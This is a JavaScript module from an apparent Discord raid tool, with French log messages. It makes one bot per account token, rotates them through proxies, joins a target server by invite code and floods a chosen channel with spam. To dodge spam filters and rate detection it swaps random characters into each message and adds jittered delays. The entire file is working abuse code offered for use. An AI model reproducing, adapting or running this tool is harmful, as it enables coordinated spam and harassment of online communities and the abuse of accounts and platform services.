// Imports
const chalk = require("chalk");

const checker = require("./checker.js");
const Bot = require("./Bot.js");

// Bot arrays
let bots = [];
let aliveBots = [];

// Possible characters
const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

let active;
let attack;

// Default settings
let settings = {
    character: "§",
    joinDelay: 500,
    messageDelay: 1000,
    delayPadding: 250
};

// Apply random padding
function rand(value) {
    return Math.floor(Math.random() * settings.delayPadding + value - settings.delayPadding);
}

// From array to object array
function list(list, working) {
    return list.map(item => {
        return {
            item: item,
            working: working.includes(item)
        }
    });
}

// Get object
function get() {
    return {
        active: active,
        attack: attack,
        settings: settings,
        bots: list(bots, aliveBots),
        proxies: list(checker.proxies, checker.passedProxies),
        tokens: list(checker.tokens, checker.passedTokens),
        proxyCount: checker.passedProxies.length,
        tokenCount: checker.passedTokens.length,
        botCount: aliveBots.length
    }
}

// Modify settings
function modify(body) {
    settings = body;
}

// Start attack
// Alot of indentation, but I find it reasonable. Might modularize in the future
function start(body) {

    active = true;

    attack = body;

    let proxies = checker.passedProxies;
    let tokens = checker.passedTokens;

    // Proxy index
    let p = 0;

    // Map bots
    bots = tokens.map(token => {
        let proxy = proxies[p];

        p++;
        if (p == proxies.length) p = 0;

        return new Bot(token, proxy);
    });

    aliveBots = bots;

    // Bot index
    let b = 0;

    function join() {
        if (!active) return console.log(chalk.red("Stopper ✗"));

        let bot = bots[b];

        // Remove the bot from aliveBots array
        function kill() {
            aliveBots.splice(aliveBots.indexOf(bot), 1);
        }

        // Attempt to join server
		try {
        bot.req("POST", "https://discordapp.com/api/v6/invite/" + attack.invite).then(body => {
            let parsed = JSON.parse(body);

            if (!parsed.guild.id) {
                console.log(chalk.red("Un bot est mort ✗") + " (N'as pas rejoins)");
                kill();
            } else {
                
                // Join was successful start spamming
                function message() {
                    if (!active) return console.log(chalk.red("Stopper ✗"));

                    let content = "";

                    // Replace wildcards with random characters
                    for (var i = 0; i < attack.message.length; i++) {
                        let char = attack.message[i];
                        if (char == settings.character) content += chars.charAt(Math.floor(Math.random() * chars.length));
                        else content += char;
                    }

                    bot.req("POST", "https://discordapp.com/api/v6/channels/" + attack.id + "/messages", {content: content}).then(body => {
                        let parsed = JSON.parse(body);

                        if (!parsed.content) {
                            bot.fails++;
                        } else {
                            bot.fails = 0;
                        }
                    }).catch(error => {
                        bot.fails++;
                    });
					

                    // If a bot fails 3 messages in a row remove it
                    if (bot.fails >= 3) {
                        console.log(chalk.red("Un bot est mort ✗"));
                        kill();

                        // If no more bots are alive stop
                        if (aliveBots.length == 0) {
                            console.log(chalk.red("Stopper ✗") + " (Plus de bots)");
                            active = false;
                        }
                    }

                    // Repeat after delay
                    setTimeout(() => {message()}, rand(settings.messageDelay));
                }

                message();

            }
        }).catch(error => {
            console.log(chalk.red("Un bot est mort ✗") + " (N'as pas rejoins)");
            kill();

            // If no more bots are alive stop
            if (aliveBots.length == 0) {
                console.log(chalk.red("Stopper ✗") + " (Plus de bots)");
                active = false;
            }
        });
	} catch (err) {
			console.log(chalk.red("Un bot est mort ✗") + " (N'as pas rejoins)");
			kill();
			
			            if (aliveBots.length == 0) {
                console.log(chalk.red("Stopper ✗") + " (Plus de bots)");
                active = false;
            }
		}
        b++;

        // Repeat after delay
        if (b < bots.length) setTimeout(() => join(), rand(settings.joinDelay));
    }

    join();

}

// Stop attack
function stop(body) {
    active = false;
}

// Exports
exports.modify = modify;
exports.start = start;
exports.stop = stop;
exports.get = get;